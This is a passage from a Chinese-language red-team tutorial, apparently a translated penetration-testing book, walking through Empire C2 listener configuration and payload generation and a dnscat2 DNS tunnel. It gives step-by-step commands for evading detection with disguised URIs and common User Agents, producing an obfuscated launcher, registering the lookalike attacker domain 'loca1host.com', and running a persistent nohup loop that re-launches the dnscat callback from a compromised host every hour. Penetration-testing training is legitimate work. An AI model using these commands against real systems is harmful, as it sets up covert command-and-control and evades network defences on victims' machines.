-   将CertPath设置为真正的可信SSL证书。
-   修改主机默认配置，许多第7层防火墙查找的是静态主机配置。
-   修改User Agent选项值。
正如在本书前两版中提到的，Metasploit可以使用rc文件，实现自动化配置，Empire现在也支持自动运行脚本以提高效率，这将在本书后面的章节进行讨论。
-   运行Empire。
    -   cd/opt/Empire && ./setup/reset.sh
-   退出。
    -   exit
-   设置证书（最好使用真实可信证书）。
    -   ./setup/cert.sh
-   运行Empire。
    -   ./empire
-   开启监听。
    -   listeners
-   选择监听（我们在试验中使用HTTP）。
    -   uselistener \[tab twice to see all listener types\]
    -   uselistener http
-   查看监听者的所有配置。
    -   info
-   设置下面的参数（i.e. set KillDate 12/12/2020）。
    -   KillDate，结束行动，清除代理
    -   DefaultProfile，必须修改所有主机，例如/admin/get.php
        和/news.php。可以伪装成想要设置的内容，例如/seriously/notmalware.php
    -   DefaultProfile，必须修改User Agent。我喜欢查看常用User
        Agent，并选择其中一个
    -   Host，切换到HTTPS，端口号为443
    -   CertPath，添加SSL证书路径
    -   UserAgent，修改此处，使用常用的User Agent
    -   Port，设置443端口
    -   ServerVersion，修改此处，使用常用服务头
-   所有配置完成，开启监听程序，如图1.6所示。
    -   execute
#### 配置静荷 {.sigil_not_in_toc1}
静荷是在突破主机上运行的真正的恶意软件。这些静荷可以在Windows、Linux和macOS中运行，但Empire最为知名的是PowerShell
Windows静荷。
-   单击主菜单。
    -   main
-   为macOS、Windows和Linux操作系统创建可用的阶段。创建一个简单的bat文件作为示例，但您可以创建Office宏文件或者创建Rubber
    Ducky的静荷。
    -   usestager \[tab twice to see all the different types\]
    -   usestager windows/launcher_bat
![0106](OEBPS/Images/12.png){.calibre18 width="1038" height="787"}
图1.6
-   查看所有参数。
    -   info
-   配置所有参数。
    -   set Listener http
    -   Configure the UserAgent
-   创建静荷。
    -   generate
-   在另外一个终端窗口查看静荷的参数，如图1.7所示。
    -   cat/tmp/launcher.bat
![0107](OEBPS/Images/13.png){.calibre17 width="1279" height="414"}
图1.7
如上所述，我们创建的静荷是深度混淆的。您现在可以在任何Windows操作系统上放置.bat文件。当然，您可能会创建一个Office宏或一个Rubber
Ducky静荷，但这只是众多示例中的一个。
如果您尚未在Kali镜像上安装PowerShell，最好的方法是手动安装。在Kali上安装PowerShell需要执行下述代码。
-   apt-get install libunwind8。
-   wget
    http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.0\_
    1.0.1t- 1+deb7u3_amd64.deb。
-   dpkg-i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb。
-   wget
    http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-7ubuntu0.3_amd64.deb。
-   dpkg-i libicu55_55.1-7ubuntu0.3_amd64.deb。
-   wget
    https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell\_
    6.0.2-1.ubuntu.16.04_amd64.deb。
-   dpkg-i powershell_6.0.2-1.ubuntu.16.04_amd64.deb。
### 1.4.4 dnscat2 {#1-008.html#nav_point_21 .calibre20}
dnscat2工具是通过DNS协议创建加密的命令和控制（C2）通道，这是适用于几乎所有网络的有效隧道（见GitHub的相关内容）。
基于DNS协议来实现命令和控制以及网络渗透，提供了一种很好的机制隐藏您的流量、规避网络检测和绕过网络限制。在许多受限制的环境或生产环境中，我们遇到过网络要么不允许出站流量，要么严格限制/监控流量。为了解决这些问题，我们可以使用dnscat2工具。使用dnscat2工具的原因是因为它不需要管理员权限，可以实现远程访问和网络渗透。
许多高安全网络环境禁止UDP或TCP数据包直接出站。那么为什么我们不利用基础架构中已经内置的服务？许多严格保护的网络中包含内部DNS服务器，用于解析内部主机的域名，同时还允许解析外部的资源。我们可以搭建权威DNS服务器，实现恶意域名的解析，通过修改DNS解析数据包内容，执行恶意软件的命令和控制功能，如图1.8所示。
![0108](OEBPS/Images/14.png){.calibre24 width="1279" height="689"}
图1.8
在攻击场景中，我们将设置名为"loca1host.com"的攻击者域名。这与localhost很相似，希望可以稍微隐藏我们的网络流量。您需要将"loca1host.com"替换成自己拥有的域名。我们将配置loca1host.com的DNS信息，使其指向我们安装的权威DNS服务器。在此示例中，我们将使用GoDaddy的DNS配置工具，您也可以使用任何DNS服务。
#### 1．使用GoDaddy搭建权威DNS服务器 {.sigil_not_in_toc1}
-   搭建虚拟专用网络服务器作为命令和控制服务器，获取服务器IP地址。
-   在购买域名后，登录GoDaddy（或类似域名提供商）账户。
-   选择您的域名，单击管理，并选择高级选项。
-   设置DNS管理的主机名，使其指向您的服务器。
    -   ns1（虚拟专用服务器IP地址）
    -   ns2（虚拟专用服务器IP地址）
-   修改Nameservers为定制模式。
    -   添加ns1.loca1host.com
    -   添加ns2.loca1host.com
如图1.9所示，现在设置名字服务器指向ns1.loca1host.com和ns2.loca1host.com，它们都指向攻击者虚拟专用服务器。如果您尝试解析loca1host.com（如vpn.loca1host.com）的任何子域，那么它将尝试使用我们的虚拟专用服务器来执行域名解析。幸运的是，dnscat2在UDP
53端口进行监听，并为我们完成所有繁重的工作。
![0109](OEBPS/Images/15.png){.calibre25 width="1278" height="283"}
图1.9
接下来，我们需要设置攻击者服务器作为名字服务器。设置dnscat2服务器。
-   sudo su-。
-   apt-get update。
-   apt-get install ruby-dev。
-   git clone https://github.com/iagox86/dnscat2.git。
-   cd dnscat2/server/。
-   apt-get install gcc make。
-   gem install bundler。
-   bundle install。
-   测试是否发挥作用：ruby ./dnscat2.rb。
-   简单提示：如果使用Amazon Lightsail虚拟专用服务器，那么一定要开放UDP
    53端口。
对于客户端代码，我们需要将其编译成二进制文件，并在Linux上运行。
#### 2．编译客户端 {.sigil_not_in_toc1}
-   git clone
    https://github.com/iagox86/dnscat2.git/opt/dnscat2/client。
-   cd /opt/dnscat2/client/。
-   make。
-   dnscat二进制文件已经生成。
-   在Windows环境中，使用Visual
    Studio加载client/win32/dnscat2.vcproj工程，并进行编译。
现在已经配置了权威DNS，攻击者服务器运行dnscat2程序，负责DNS域名解析，并且恶意软件已经编译完毕，我们已准备好执行静荷。
在开始之前，我们需要在攻击者服务器上启动dnscat。虽然有多种配置可供使用，但是必须要配置\--secret标志，确保DNS请求中的通信是加密的。确保将loca1host.com替换为您拥有的域名，并创建随机密钥字符串。
在攻击者服务器上启动dnscat2。
-   screen。
-   ruby ./dnscat2.rb loca1host.com \--secret 39dfj3hdsfajh37e8c902j。
假设有一个存在漏洞的服务器，您能够在其上远程执行代码。您可以运行shell命令并上传dnscat静荷。执行我们的静荷。
-   ./dnscat loca1host.com \--secret 39dfj3hdsfajh37e8c902j。
这将启动 dnscat
程序，使用我们的权威服务器创建命令和控制通道。有时我碰到dnscat2服务"死机"了，原因可能是大文件传输，或者仅仅是程序出现了问题。为了解决这种类型的问题，我要确保dnscat能够有效回连。为此，我通常喜欢使用快速bash脚本，启动dnscat静荷。
-   nohup/bin/bash -c \"while true; do/opt/dnscat2/client/dnscat
    loca1host.com \--secret 39dfj3hdsfajh37e8c902j \--max-retransmits 5;
    sleep 3600; done\" \>/dev/null 2\>&1 &。
这将确保如果客户端静荷因任何原因"死机"了，它将每小时生成一个新实例。有时只有一次机会让您的静荷执行，因此需要让它发挥作用！
最后，如果想在Windows系统上运行这个静荷，您可以使用dnscat2静荷。为什么不在PowerShell中执行此操作？Luke
Baggett写了一个关于dnscat客户端的PowerShell版本。
#### 3．dnscat2连接 {.sigil_not_in_toc1}
在静荷执行并回连到攻击者服务器之后，我们应该看到类似于下面的新的ENCRYPTED
AND
VERIFIED消息。通过输入"window"，dnscat2将显示所有会话。目前，我们可以看到图1.10中有一个名为"1"的会话。